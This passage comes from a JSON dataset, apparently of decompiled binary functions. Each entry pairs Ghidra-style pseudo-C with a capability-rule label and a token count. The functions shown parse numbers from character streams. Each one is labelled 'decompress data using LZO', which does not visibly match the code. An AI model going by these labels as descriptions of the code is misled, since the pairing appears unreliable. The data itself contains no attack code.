arg_8h[2];\n                        if (arg_8h[3] <= uVar16) {\n                            var_48h = 8;\n                            goto code_r0x004536e0;\n                        }\ncode_r0x0045363a:\n                        arg_8h[2] = uVar16 + 2;\ncode_r0x00453649:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar9 = *arg_8h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar17 = false;\n                        if (iVar9 == -1) {\n                            arg_8h = NULL;\n                            bVar17 = true;\n                        }\n                    }\n                    else {\n                        if (!bVar19) break;\ncode_r0x004535f2:\n                        if ((*(iVar10 + 0x74) != uVar8) && (*(iVar10 + 0x76) != uVar8)) {\n                            uVar3 = 0;\n                            bVar19 = true;\n                            goto code_r0x00453320;\n                        }\n                        uVar3 = var_48h == 0x10 || uVar11 == 0;\n                        if (var_48h != 0x10 && uVar11 != 0) {\n                            bVar19 = true;\n                            goto code_r0x0045332c;\n                        }\n                        var_38h = 0;\n                        var_48h = 0x10;\n                        bVar17 = false;\ncode_r0x0045362b:\n                        uVar16 = arg_8h[2];\n                        bVar19 = bVar17;\n                        if (uVar16 < arg_8h[3]) goto code_r0x0045363a;\ncode_r0x004536e0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00453649;\n                        bVar17 = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar5 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar9 = *arg_10h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar5 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar5 = bVar15;\n                        }\n                    }\n                    if (bVar5 == bVar17) {\n                        uVar3 = 1;\n                        goto code_r0x00453320;\n                    }\n                    uVar8 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar8 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar19) break;\n                    cVar6 = *(iVar10 + 0x10);\n                }\n                uVar3 = 0;\n            }\ncode_r0x00453320:\n            var_4ch = 0x16;\n            if (var_48h != 0x10) goto code_r0x0045332c;\n        }\n        else {\n            uVar8 = 0;\n            var_38h = 0;\n            bVar19 = false;\n            bVar20 = false;\ncode_r0x0045332c:\n            var_4ch = var_48h;\n        }\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        if (*(iVar10 + 0x10) != '\\0') {\ncode_r0x00453a90:\n            fcn.0046d280(0x20);\n        }\n        var_40h = &arg_10h;\n        var_60h = 0;\n        var_5ch = -0x80000000;\n        if (!bVar20) {\n            var_60h = 0xffffffff;\n            var_5ch = 0x7fffffff;\n        }\n        uVar21 = fcn.00418980(var_60h, var_5ch, var_48h, 0);\n        uVar11 = uVar21 >> 0x20;\n        var_32h = *(iVar10 + 0xa4);\n        if (var_32h == 0) {\n            if (uVar3 == 0) {\n                uVar16 = 0;\n                uVar18 = 0;\n                var_32h = uVar3;\n                do {\n                    uVar12 = uVar8;\n                    if (var_4ch < 0xb) {\n                        if ((uVar8 < 0x30) || (var_4ch + 0x30U <= uVar8)) goto code_r0x00453792;\ncode_r0x004533fc:\n                        uVar1 = uVar12 - 0x30;\n                    }\n                    else {\n                        if (uVar8 - 0x30 < 10) goto code_r0x004533fc;\n                        uVar1 = uVar12 - 0x57;\n                        if (5 < uVar8 - 0x61) {\n                            if (5 < uVar8 - 0x41) goto code_r0x00453792;\n                            uVar1 = uVar12 - 0x37;\n                        }\n                    }\n                    if (uVar1 == 0xffffffff) goto code_r0x00453792;\n                    if (uVar11 < uVar18 || uVar11 - uVar18 < (uVar21 < uVar16)) {\n                        var_32h = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x00453847;\ncode_r0x0045345f:\n                        arg_8h[2] = uVar12 + 2;\n                    }\n                    else {\n                        uVar12 = uVar16 * var_48h;\n                        uVar18 = (uVar16 * var_48h >> 0x20) + var_48h * uVar18;\n                        uVar16 = (var_5ch - (uVar1 >> 0x1f)) - (var_60h < uVar1);\n                        var_32h = var_32h | (uVar16 < uVar18 || uVar16 - uVar18 < (var_60h - uVar1 < uVar12));\n                        uVar16 = uVar12 + uVar1;\n                        uVar18 = uVar18 + (uVar1 >> 0x1f) + CARRY4(uVar12, uVar1);\n                        var_38h = var_38h + 1;\n                        uVar12 = arg_8h[2];\n                        if (uVar12 < arg_8h[3]) goto code_r0x0045345f;\ncode_r0x00453847:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    uVar4 = fcn.00430e20(var_40h);\n                    uVar7 = uVar3;\n                    if (uVar4 != 0) goto code_r0x00453489;\n                    uVar8 = fcn.00430ec0();\n                } while( true );\n            }\n            uVar16 = 0;\n            uVar18 = 0;\n            uVar4 = uVar3;\n            uVar7 = 0;\n        }\n        else {\ncode_r0x00453902:\n            var_54h = uVar21 >> 0x20;\n            var_50h = uVar21;\n            if (uVar3 == 0) {\n                var_32h = 0;\n                uVar16 = 0;\n                uVar18 = 0;\n                uVar7 = *(iVar10 + 0x10);\n                if (uVar7 == 0) goto code_r0x004539a3;\ncode_r0x00453928:\n                if (*(iVar10 + 0x26) != uVar8) goto code_r0x004539a3;\n                if (var_38h != 0) {\n                    fcn.0046d560(var_38h);\n                    var_38h = 0;\ncode_r0x00453951:\n                    uVar11 = arg_8h[2];\n                    if (arg_8h[3] <= uVar11) goto code_r0x00453a10;\n                    do {\n                        arg_8h[2] = uVar11 + 2;\n                        while( true ) {\n                            var_40h = &arg_10h;\n                            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                            uVar4 = fcn.00430e20(var_40h);\n                            uVar7 = uVar3;\n                            if (uVar4 != 0) goto code_r0x00453489;\n                            uVar8 = fcn.00430ec0();\n                            uVar7 = *(iVar10 + 0x10);\n                            if (uVar7 != 0) goto code_r0x00453928;\ncode_r0x004539a3:\n                            puVar13 = iVar10 + 0x78;\n                            uVar11 = var_4ch;\n                            if (uVar8 == *(iVar10 + 0x24)) goto code_r0x00453792;\n                            while (*puVar13 != uVar8) {\n                                uVar11 = uVar11 - 1;\n                                puVar13 = puVar13 + 1;\n                                if (uVar11 == 0) {\n                                    uVar4 = 0;\n                                    uVar7 = uVar3;\n                                    goto code_r0x00453489;\n                                }\n                            }\n                            iVar14 = puVar13 - (iVar10 + 0x78);\n                            uVar12 = iVar14 >> 1;\n                            uVar11 = uVar12 - 6;\n                            if (iVar14 < 0x1f) {\n                                uVar11 = uVar12;\n                            }\n                            if (uVar18 <= var_54h && (var_50h < uVar16) <= var_54h - uVar18) {\n                                uVar12 = uVar16 * var_48h;\n                                uVar18 = (uVar16 * var_48h >> 0x20) + var_48h * uVar18;\n                                uVar16 = (var_5ch - (uVar11 >> 0x1f)) - (var_60h < uVar11);\n                                var_32h = var_32h | (uVar16 < uVar18 || uVar16 - uVar18 < (var_60h - uVar11 < uVar12));\n                                uVar16 = uVar12 + uVar11;\n                                uVar18 = uVar18 + (uVar11 >> 0x1f) + CARRY4(uVar12, uVar11);\n                                var_38h = var_38h + 1;\n                                goto code_r0x00453951;\n                            }\n                            var_32h = 1;\n                            uVar11 = arg_8h[2];\n                            if (uVar11 < arg_8h[3]) break;\ncode_r0x00453a10:\n                            (**(*arg_8h + 0x28))();\n                        }\n                    } while( true );\n                }\n                uVar4 = 0;\n            }\n            else {\n                uVar16 = 0;\n                uVar18 = 0;\n                var_32h = 0;\n                uVar7 = 0;\n                uVar4 = uVar3;\n            }\n        }\n    }\n    else {\n        var_48h = 10;\n        if (uVar11 != 8) goto code_r0x0045326f;\n        var_48h = 0x10;\n        uVar4 = fcn.00430e20(&arg_10h);\n        if (uVar4 == 0) goto code_r0x0045328e;\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        uVar3 = *(iVar10 + 0x10);\n        if (uVar3 != 0) {\n            var_38h = 0;\n            uVar8 = 0;\n            bVar19 = false;\n            bVar20 = false;\n            var_4ch = 0x16;\n            var_48h = 0x10;\n            goto code_r0x00453a90;\n        }\n        var_32h = *(iVar10 + 0xa4);\n        bVar20 = false;\n        bVar19 = false;\n        if (var_32h != 0) {\n            var_38h = 0;\n            uVar8 = 0;\n            var_4ch = 0x16;\n            uVar21 = 0x7ffffffffffffff;\n            var_60h = 0xffffffff;\n            var_5ch = 0x7fffffff;\n            var_48h = 0x10;\n            uVar3 = var_32h;\n            goto code_r0x00453902;\n        }\n        uVar7 = 0;\n        uVar16 = 0;\n        uVar18 = 0;\n        var_38h = 0;\n    }\ncode_r0x00453489:\n    uVar2 = uVar4;\n    uVar3 = uVar7;\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00453497;\ncode_r0x004537a2:\n    uVar4 = uVar2;\n    fcn.0046d560(var_38h);\n    cVar6 = fcn.0049e880(*(iVar10 + 8), *(iVar10 + 0xc), &var_1eh + 2);\n    if (cVar6 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((var_38h != 0) || (bVar19)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x004537f3;\n    goto code_r0x004534ac;\ncode_r0x00453792:\n    uVar4 = 0;\n    uVar2 = 0;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x004537a2;\ncode_r0x00453497:\n    if ((var_38h != 0) || (bVar19)) {\ncode_r0x004537f3:\n        if (uVar3 == 0) {\n            if (var_32h == 0) {\n                if (bVar20) {\n                    bVar19 = uVar16 != 0;\n                    uVar16 = -uVar16;\n                    uVar18 = -(uVar18 + bVar19);\n                }\n                *arg_20h = uVar16;\n                arg_20h[1] = uVar18;\n            }\n            else {\n                uVar11 = 0;\n                uVar16 = 0x80000000;\n                if (!bVar20) {\n                    uVar11 = 0xffffffff;\n                    uVar16 = 0x7fffffff;\n                }\n                *arg_20h = uVar11;\n                arg_20h[1] = uVar16;\n                *arg_1ch = 4;\n            }\n            goto code_r0x004534c5;\n        }\n    }\ncode_r0x004534ac:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x004534c5:\n    var_64h = &var_1eh + 1;\n    if (uVar4 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(var_64h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4645
    },
    "00453b90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00453b90(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint16_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    bool bVar6;\n    char cVar7;\n    uint16_t uVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint16_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    bool bVar20;\n    ulong uVar21;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint8_t var_3eh;\n    int32_t var_3dh;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar4 = arg_18h;\n    iVar10 = fcn.0042e500(arg_18h + 0x6c);\n    uVar11 = *(iVar4 + 0xc) & 0x4a;\n    if (uVar11 == 0x40) {\n        uVar18 = 8;\ncode_r0x00453bcf:\n        var_3dh._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_3dh == '\\0') {\ncode_r0x00453bee:\n            var_4ch = &arg_10h;\n            uVar8 = fcn.00430ec0();\n            bVar20 = *(iVar10 + 0x70) == uVar8;\n            cVar5 = *(iVar10 + 0x10);\n            if ((((bVar20) || (*(iVar10 + 0x72) == uVar8)) && ((cVar5 == '\\0' || (*(iVar10 + 0x26) != uVar8)))) &&\n               (*(iVar10 + 0x24) != uVar8)) {\n                fcn.004867f0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_3dh._0_1_ = fcn.00430e20(var_4ch);\n                stack0xffffffc0 = 0;\n                bVar19 = false;\n                if (var_3dh == '\\0') {\n                    uVar8 = fcn.00430ec0();\n                    cVar5 = *(iVar10 + 0x10);\n                    goto code_r0x00453e40;\n                }\n            }\n            else {\ncode_r0x00453e40:\n                stack0xffffffc0 = 0;\n                bVar19 = false;\n                while (((cVar5 == '\\0' || (*(iVar10 + 0x26) != uVar8)) && (*(iVar10 + 0x24) != uVar8))) {\n                    if (*(iVar10 + 0x78) == uVar8) {\n                        bVar6 = uVar18 == 10 | bVar19 ^ 1U;\n                        if (!bVar6) goto code_r0x00453e7c;\n                        bVar19 = uVar11 == 0 || uVar18 == 8;\n                        if (uVar11 != 0 && uVar18 != 8) {\n                            unique0x00007a80 = stack0xffffffc0 + 1;\n                            goto code_r0x00453eb2;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar18 = 8;\n                        uVar14 = arg_8h[2];\n                        if (uVar14 < arg_8h[3]) goto code_r0x00453ec1;\ncode_r0x00453fc0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00453ed0;\n                        var_38h._0_1_ = true;\n                    }\n                    else {\n                        if (!bVar19) break;\ncode_r0x00453e7c:\n                        if ((*(iVar10 + 0x74) != uVar8) && (*(iVar10 + 0x76) != uVar8)) {\n                            var_3dh._0_1_ = '\\0';\n                            bVar19 = true;\n                            goto code_r0x00453c61;\n                        }\n                        var_3dh._0_1_ = uVar18 == 0x10 || uVar11 == 0;\n                        if (uVar18 != 0x10 && uVar11 != 0) {\n                            bVar19 = true;\n                            goto code_r0x00453c6d;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar18 = 0x10;\n                        bVar6 = false;\ncode_r0x00453eb2:\n                        uVar14 = arg_8h[2];\n                        bVar19 = bVar6;\n                        if (arg_8h[3] <= uVar14) goto code_r0x00453fc0;\ncode_r0x00453ec1:\n                        arg_8h[2] = uVar14 + 2;\ncode_r0x00453ed0:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar9 = *arg_8h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                        }\n                        var_38h._0_1_ = false;\n                        if (iVar9 == -1) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar16 = arg_10h != NULL && arg_14h == -1;\n                    bVar6 = arg_14h == -1;\n                    if (bVar16) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar9 = *arg_10h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar6 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar6 = bVar16;\n                        }\n                    }\n                    if (var_38h._0_1_ == bVar6) {\n                        var_3dh._0_1_ = '\\x01';\n                        goto code_r0x00453c61;\n                    }\n                    uVar8 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar8 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar19) break;\n                    cVar5 = *(iVar10 + 0x10);\n                }\n                var_3dh._0_1_ = '\\0';\n            }\ncode_r0x00453c61:\n            var_50h = 0x16;\n            if (uVar18 == 0x10) goto code_r0x00453c70;\n        }\n        else {\n            uVar8 = 0;\n            stack0xffffffc0 = 0;\n            bVar19 = false;\n            bVar20 = false;\n        }\ncode_r0x00453c6d:\n        var_50h = uVar18;\n    }\n    else {\n        uVar18 = 10;\n        if (uVar11 != 8) goto code_r0x00453bcf;\n        uVar18 = 0x10;\n        var_3dh._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_3dh == '\\0') goto code_r0x00453bee;\n        uVar8 = 0;\n        stack0xffffffc0 = 0;\n        uVar18 = 0x10;\n        bVar19 = false;\n        bVar20 = false;\n        var_50h = 0x16;\n    }\ncode_r0x00453c70:\n    cVar5 = var_3dh;\n    var_4ch = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar10 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar21 = fcn.00418980(0xffffffff, 0xffffffff, uVar18, 0);\n    uVar11 = uVar21 >> 0x20;\n    uVar2 = *(iVar10 + 0xa4);\n    if (uVar2 == 0) {\n        var_3eh = 0;\n        if (var_3dh == '\\0') {\n            var_38h = 0;\n            var_34h = 0;\n            do {\n                uVar14 = uVar8;\n                if (var_50h < 0xb) {\n                    if ((uVar8 < 0x30) || (var_50h + 0x30U <= uVar8)) goto code_r0x00454070;\ncode_r0x00453d1d:\n                    uVar14 = uVar14 - 0x30;\n                }\n                else {\n                    if (uVar8 - 0x30 < 10) goto code_r0x00453d1d;\n                    if (uVar8 - 0x61 < 6) {\n                        uVar14 = uVar14 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar8 - 0x41) goto code_r0x00454070;\n                        uVar14 = uVar14 - 0x37;\n                    }\n                }\n                if (uVar14 == 0xffffffff) goto code_r0x00454070;\n                if (uVar11 < var_34h || uVar11 - var_34h < (uVar21 < var_38h)) {\n                    var_3eh = 1;\n                    uVar14 = arg_8h[2];\n                    if (uVar14 < arg_8h[3]) goto code_r0x00453d8b;\ncode_r0x00454118:\n                    (**(*arg_8h + 0x28))();\n                }\n                else {\n                    uVar12 = var_38h * uVar18;\n                    uVar17 = (var_38h * uVar18 >> 0x20) + uVar18 * var_34h;\n                    uVar15 = ~(uVar14 >> 0x1f);\n                    var_3eh = var_3eh | (uVar15 < uVar17 || uVar15 - uVar17 < (~uVar14 < uVar12));\n                    var_38h = uVar14 + uVar12;\n                    var_34h = (uVar14 >> 0x1f) + uVar17 + CARRY4(uVar14, uVar12);\n                    uVar14 = arg_8h[2];\n                    unique0x00007a80 = stack0xffffffc0 + 1;\n                    if (arg_8h[3] <= uVar14) goto code_r0x00454118;\ncode_r0x00453d8b:\n                    arg_8h[2] = uVar14 + 2;\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar5 = fcn.00430e20(var_4ch);\n                if (cVar5 != '\\0') goto code_r0x00453db5;\n                uVar8 = fcn.00430ec0();\n            } while( true );\n        }\n        var_38h = 0;\n        var_3dh._0_1_ = '\\0';\n        var_34h = 0;\n    }\n    else if (var_3dh == '\\0') {\n        puVar1 = iVar10 + 0x78;\n        var_3eh = 0;\n        cVar7 = *(iVar10 + 0x10);\n        var_38h = 0;\n        var_34h = 0;\n        if (cVar7 == '\\0') goto code_r0x00454250;\ncode_r0x004541d3:\n        if (*(iVar10 + 0x26) != uVar8) goto code_r0x00454250;\n        if (stack0xffffffc0 != 0) {\n            fcn.0046d560(stack0xffffffc0);\n            stack0xffffffc0 = 0;\ncode_r0x004541fe:\n            uVar14 = arg_8h[2];\n            if (arg_8h[3] <= uVar14) goto code_r0x004542b7;\n            do {\n                arg_8h[2] = uVar14 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar5 = fcn.00430e20(var_4ch);\n                    if (cVar5 != '\\0') goto code_r0x00453db5;\n                    uVar8 = fcn.00430ec0();\n                    cVar7 = *(iVar10 + 0x10);\n                    if (cVar7 != '\\0') goto code_r0x004541d3;\ncode_r0x00454250:\n                    if (uVar8 == *(iVar10 + 0x24)) goto code_r0x00454070;\n                    uVar3 = *puVar1;\n                    puVar13 = puVar1;\n                    uVar14 = var_50h;\n                    while (uVar3 != uVar8) {\n                        puVar13 = puVar13 + 1;\n                        uVar14 = uVar14 - 1;\n                        if (uVar14 == 0) goto code_r0x00454070;\n                        uVar3 = *puVar13;\n                    }\n                    uVar12 = puVar13 - puVar1 >> 1;\n                    uVar14 = uVar12 - 6;\n                    if (puVar13 - puVar1 < 0x1f) {\n                        uVar14 = uVar12;\n                    }\n                    if (var_34h <= uVar11 && (uVar21 < var_38h) <= uVar11 - var_34h) {\n                        uVar12 = var_38h * uVar18;\n                        uVar17 = var_34h * uVar18 + (var_38h * uVar18 >> 0x20);\n                        uVar15 = ~(uVar14 >> 0x1f);\n                        var_3eh = var_3eh | (uVar15 < uVar17 || uVar15 - uVar17 < (~uVar14 < uVar12));\n                        var_38h = uVar14 + uVar12;\n                        var_34h = (uVar14 >> 0x1f) + uVar17 + CARRY4(uVar14, uVar12);\n                        unique0x00007a80 = stack0xffffffc0 + 1;\n                        goto code_r0x004541fe;\n                    }\n                    uVar14 = arg_8h[2];\n                    var_3eh = uVar2;\n                    if (uVar14 < arg_8h[3]) break;\ncode_r0x004542b7:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar5 = '\\0';\n        var_3dh._0_1_ = cVar7;\n    }\n    else {\n        var_38h = 0;\n        var_34h = 0;\n        var_3eh = 0;\n        var_3dh._0_1_ = '\\0';\n    }\ncode_r0x00453db5:\n    cVar7 = cVar5;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00454080;\ncode_r0x00453dc3:\n    if ((stack0xffffffc0 != 0) || (bVar19)) {\ncode_r0x004540ce:\n        if (var_3dh == '\\0') {\n            if (var_3eh == 0) {\n                if (bVar20) {\n                    bVar19 = var_38h != 0;\n                    var_38h = -var_38h;\n                    var_34h = -(var_34h + bVar19);\n                }\n                *arg_20h = var_38h;\n                arg_20h[1] = var_34h;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                arg_20h[1] = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00453df1;\n        }\n    }\n    goto code_r0x00453dd8;\ncode_r0x00454070:\n    cVar5 = '\\0';\n    cVar7 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00453dc3;\ncode_r0x00454080:\n    cVar5 = cVar7;\n    fcn.0046d560(var_3dh._1_1_);\n    cVar7 = fcn.0049e880(*(iVar10 + 8), *(iVar10 + 0xc), &var_1eh + 2);\n    if (cVar7 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc0 != 0) || (bVar19)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x004540ce;\ncode_r0x00453dd8:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x00453df1:\n    if (cVar5 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4250
    },
    "00454450": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00454450(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint noname_3, int32_t arg_18h, uint *arg_1ch, int32_t *arg_20h\n            )\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint16_t *puVar11;\n    uint8_t uVar12;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint8_t var_31h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar7 = fcn.0042e500(arg_18h + 0x6c);\n    uVar3 = fcn.00430e20(&arg_10h);\n    if (uVar3 == 0) {\n        uVar6 = fcn.00430ec0();\n        cVar4 = *(iVar7 + 0x10);\n        if ((((*(iVar7 + 0x72) == uVar6) || (*(iVar7 + 0x70) == uVar6)) &&\n            ((cVar4 == '\\0' || (*(iVar7 + 0x26) != uVar6)))) && (*(iVar7 + 0x24) != uVar6)) {\n            fcn.0046d560((*(iVar7 + 0x72) != uVar6) * '\\x02' + '+');\n            fcn.004867f0();\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            uVar3 = fcn.00430e20(&arg_10h);\n            var_38h = 0;\n            uVar12 = 0;\n            if (uVar3 != 0) goto code_r0x004544a0;\n            uVar6 = fcn.00430ec0();\n            cVar4 = *(iVar7 + 0x10);\n        }\n        uVar12 = 0;\n        var_38h = 0;\n        while ((((cVar4 == '\\0' || (*(iVar7 + 0x26) != uVar6)) && (*(iVar7 + 0x24) != uVar6)) &&\n               (*(iVar7 + 0x78) == uVar6))) {\n            if (uVar12 == 0) {\n                fcn.0046d560(0x30);\n                uVar8 = arg_8h[2];\n                if (uVar8 < arg_8h[3]) goto code_r0x00454a04;\ncode_r0x00454a55:\n                (**(*arg_8h + 0x28))();\n            }\n            else {\n                uVar8 = arg_8h[2];\n                if (arg_8h[3] <= uVar8) goto code_r0x00454a55;\ncode_r0x00454a04:\n                arg_8h[2] = uVar8 + 2;\n            }\n            var_38h = var_38h + 1;\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            uVar3 = fcn.00430e20(&arg_10h);\n            uVar12 = uVar3;\n            if (uVar3 != 0) goto code_r0x004544a0;\n            uVar6 = fcn.00430ec0();\n            uVar12 = 1;\n            cVar4 = *(iVar7 + 0x10);\n        }\n        uVar3 = 0;\n    }\n    else {\n        var_38h = 0;\n        uVar6 = 0;\n        uVar12 = 0;\n    }\ncode_r0x004544a0:\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar7 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar2 = *(iVar7 + 0xa4);\n    if (uVar2 == 0) {\n        if (uVar3 == 0) {\n            var_31h = 0;\ncode_r0x004544e8:\n            if (9 < uVar6 - 0x30) goto code_r0x00454565;\ncode_r0x004544f4:\n            if (uVar6 - 0x30 == -1) goto code_r0x00454565;\n            fcn.0046d560((uVar6 - 0x30) + '0');\n            uVar12 = 1;\ncode_r0x00454514:\n            uVar8 = arg_8h[2];\n            if (arg_8h[3] <= uVar8) goto code_r0x00454869;\n            do {\n                arg_8h[2] = uVar8 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar4 = fcn.00430e20(&arg_10h);\n                    if (cVar4 != '\\0') goto code_r0x004546be;\n                    uVar6 = fcn.00430ec0();\n                    if (uVar6 - 0x30 < 10) goto code_r0x004544f4;\ncode_r0x00454565:\n                    if ((*(iVar7 + 0x24) == uVar6) && ((uVar3 | var_31h) == 0)) {\n                        fcn.0046d560(0x2e);\n                        var_31h = 0;\n                        uVar3 = 1;\n                        goto code_r0x00454514;\n                    }\n                    if (((*(iVar7 + 0x94) != uVar6) && (*(iVar7 + 0xa0) != uVar6)) ||\n                       (uVar12 = uVar12 & (var_31h ^ 1),  uVar12 == 0)) goto code_r0x004546be;\n                    fcn.0046d560(0x65);\n                    if (arg_8h[2] < arg_8h[3]) {\n                        arg_8h[2] = arg_8h[2] + 2;\n                    }\n                    else {\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar4 = fcn.00430e20(&arg_10h);\n                    if (cVar4 != '\\0') goto code_r0x00454b2d;\n                    uVar6 = fcn.00430ec0();\n                    var_31h = uVar12;\n                    if (*(iVar7 + 0x72) == uVar6) {\n                        uVar9 = 0x2b;\n                    }\n                    else {\n                        uVar9 = 0x2d;\n                        if (*(iVar7 + 0x70) != uVar6) goto code_r0x004544e8;\n                    }\n                    fcn.0046d560(uVar9);\n                    uVar8 = arg_8h[2];\n                    if (uVar8 < arg_8h[3]) break;\ncode_r0x00454869:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n    }\n    else if (uVar3 == 0) {\n        var_31h = 0;\n        uVar5 = *(iVar7 + 0x10);\ncode_r0x00454632:\n        if ((uVar5 != 0) && (*(iVar7 + 0x26) == uVar6)) {\n            uVar3 = uVar3 | var_31h;\n            if (uVar3 == 0) {\n                if (var_38h != 0) {\n                    fcn.0046d560(var_38h);\n                    var_31h = 0;\n                    var_38h = 0;\n                    goto code_r0x00454687;\n                }\n                fcn.0046d3b0(0, *(*arg_20h + -0xc), 0);\n                iVar10 = *(stack0xffffffe0 + -0xc);\n                goto joined_r0x00454b58;\n            }\n            iVar10 = *(stack0xffffffe0 + -0xc);\n            goto joined_r0x00454b22;\n        }\n        puVar11 = iVar7 + 0x78;\n        if (*(iVar7 + 0x24) == uVar6) {\n            iVar10 = *(stack0xffffffe0 + -0xc);\n            if ((var_31h | uVar3) == 0) {\n                if (iVar10 != 0) {\n                    fcn.0046d560(var_38h);\n                }\n                fcn.0046d560(0x2e);\n                var_31h = var_31h | uVar3;\n                uVar3 = uVar2;\n                goto code_r0x00454687;\n            }\n            goto joined_r0x00454b22;\n        }\n        do {\n            if (*puVar11 == uVar6) {\n                